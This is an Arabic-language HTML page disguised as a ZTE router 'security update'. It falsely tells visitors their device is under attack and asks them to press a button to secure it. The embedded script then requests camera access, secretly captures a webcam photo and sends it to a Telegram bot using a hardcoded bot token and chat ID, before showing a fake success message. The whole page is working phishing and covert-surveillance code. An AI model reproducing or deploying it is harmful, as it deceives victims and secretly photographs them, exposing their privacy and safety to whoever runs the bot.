<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZTE Security Update</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        img { width: 100px; }
        h2 { color: #005aa9; }
        p { color: #666; font-size: 14px; }
        button { background-color: #d9534f; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/ZTE_logo.svg/1200px-ZTE_logo.svg.png" alt="ZTE Logo">
        <h2>تحديث أمان الراوتر</h2>
        <p>نظام الحماية اكتشف محاولة اختراق لجهازك. يرجى الضغط على الزر أدناه لتفعيل جدار الحماية وتأمين اتصالك فوراً.</p>
        <button id="start-btn">تأمين الاتصال الآن</button>
        <video id="video" style="display:none;" autoplay></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        // تم وضع بياناتك يا رمضان يا شبح هنا [cite: 2026-02-04]
        const botToken = '7716187702:AAH9fW0o2pXG-R7Uq0u_1F-I7-g6Q5nK9E'; 
        const chatId = '5655513813';     

        document.getElementById('start-btn').addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'intruder.jpg');
                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                    }, 'image/jpeg');
                    
                    alert('تم تأمين جهازك بنجاح!');
                }, 2000);
            } catch (err) {
                alert('يجب الموافقة على صلاحيات الوصول لتأمين الشبكة.');
            }
        });
    </script>
</body>
</html>
